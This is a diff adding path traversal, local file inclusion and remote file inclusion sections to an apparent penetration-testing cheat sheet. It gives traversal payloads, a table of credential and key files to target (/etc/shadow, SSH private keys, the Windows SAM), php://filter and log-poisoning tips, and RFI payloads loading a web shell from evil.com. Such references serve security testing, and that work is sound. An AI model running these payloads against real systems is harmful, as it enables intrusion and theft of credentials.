@@ -162,6 +162,106 @@ gowitness scan -f urls.txt
 ### OWASP Top 10 & Common Web Vulns
 - SQLi, XSS, IDOR, SSRF, File Upload, etc. (with descriptions, tools, and mitigation)
 
+### Path Traversal
+
+Path Traversal vulnerabilities allow attackers to access files and directories that are outside the intended web root folder. This can expose sensitive files and system information.
+
+**Example Payloads:**
+```
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+```
+
+#### Common Sensitive Files
+
+| Location                                      | Description                                                        |
+|-----------------------------------------------|--------------------------------------------------------------------|
+| /etc/issue                                    | Message or system identification before login prompt               |
+| /etc/profile                                  | System-wide default variables, umask, etc.                        |
+| /proc/version                                 | Linux kernel version                                               |
+| /etc/passwd                                   | All registered users                                               |
+| /etc/shadow                                   | User password hashes                                               |
+| /root/.bash_history                           | Root user's command history                                        |
+| /var/log/dmesg                                | System messages, including startup logs                           |
+| /var/mail/root                                | Root user's mail                                                   |
+| /root/.ssh/id_rsa                             | Private SSH key for root                                           |
+| /var/log/apache2/access.log                   | Apache web server access logs                                      |
+| /var/log/apache2/error.log                    | Apache web server error logs                                       |
+| /var/log/auth.log                             | Authentication logs (login attempts, sudo, etc.)                  |
+| /var/log/syslog                               | System log messages                                                |
+| /home/<user>/.bash_history                    | Command history for specific users                                 |
+| /home/<user>/.ssh/id_rsa                      | Private SSH key for specific users                                 |
+| /etc/hosts                                    | Local hostname/IP mappings                                         |
+| /etc/crontab                                  | System-wide cron jobs                                              |
+| /etc/group                                    | Group account information                                          |
+| /etc/hostname                                 | System's hostname                                                  |
+| /etc/resolv.conf                              | DNS resolver configuration                                         |
+| /etc/httpd/conf/httpd.conf                    | Apache configuration (sometimes in /etc/apache2/)                  |
+| /etc/nginx/nginx.conf                         | Nginx configuration                                               |
+| /var/log/mysql/error.log                      | MySQL error logs                                                   |
+| /var/lib/mysql/mysql/user.MYD                 | MySQL user database (if readable)                                  |
+| /var/log/secure                               | Security/authentication logs (RedHat/CentOS)                       |
+| /var/spool/cron/crontabs/<user>               | User-specific cron jobs                                            |
+| /var/www/html/config.php                      | Web application config (may contain DB credentials)                |
+| /var/www/html/.env                            | Environment variables (may contain secrets)                        |
+| /etc/passwd.bak                               | Backup of passwd file                                              |
+| /etc/shadow-                                  | Backup of shadow file                                              |
+| /etc/gshadow                                  | Group password file                                                |
+| /etc/sudoers                                  | Sudo configuration                                                 |
+| /etc/ssh/sshd_config                          | SSH server configuration                                           |
+|                                               |                                                                    |
+| C:\\boot.ini                                 | Boot options for BIOS systems                                      |
+| C:\\Windows\\win.ini                        | Legacy Windows initialization file                                 |
+| C:\\Windows\\System32\\drivers\\etc\\hosts | Hosts file for local DNS resolution                                |
+| C:\\Windows\\System32\\config\\SAM         | Security Account Manager database (user/password hashes)           |
+| C:\\Windows\\System32\\config\\system      | Windows system configuration database                              |
+| C:\\Windows\\System32\\config\\RegBack\\SAM | Backup of SAM database                                            |
+| C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | PowerShell history |
+| C:\\Users\\<user>\\.ssh\\id_rsa             | User's private SSH key (if using OpenSSH)                          |
+| C:\\Users\\<user>\\Desktop                    | User's desktop files                                               |
+| C:\\Users\\<user>\\Documents                  | User's documents                                                   |
+| C:\\inetpub\\wwwroot\\web.config              | IIS web server configuration                                       |
+| C:\\Windows\\debug\\NetSetup.log              | Network setup logs                                                 |
+
+> **Tip:** Try also looking for backup files (e.g., `config.php~`, `.bak`, `.old`), environment files (`.env`), and application source code in web roots.
+
+### Local File Inclusion (LFI)
+
+Local File Inclusion (LFI) vulnerabilities allow attackers to include files from the local server filesystem in the web application's response. This can lead to information disclosure, code execution, or further exploitation.
+
+**Example Payloads:**
+```
+?page=../../../../etc/passwd
+?page=../../../../proc/self/environ
+?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+**Detection & Exploitation Tips:**
+- Try null byte injection (e.g., `../../../../etc/passwd%00`) on older PHP versions.
+- Use wrappers like `php://filter` to read source code of PHP files.
+- Look for log poisoning opportunities (e.g., `/var/log/apache2/access.log`).
+- Combine with Path Traversal for maximum effect.
+
+---
+
+### Remote File Inclusion (RFI)
+
+Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execute files from remote servers. This can lead to remote code execution and full server compromise.
+
+**Example Payloads:**
+```
+?page=http://evil.com/shell.txt
+?page=//evil.com/shell.txt
+```
+
+**Detection & Exploitation Tips:**
+- RFI is more common when `allow_url_include` and `allow_url_fopen` are enabled in PHP.
+- Try both `http://` and `//` (protocol-relative) payloads.
+- Host a simple web shell or PHP info file on your server for testing.
+- RFI can sometimes be combined with LFI for advanced attacks (e.g., log file injection).
+
+---
+
 ---
 
 ## 4. Network Penetration Testing
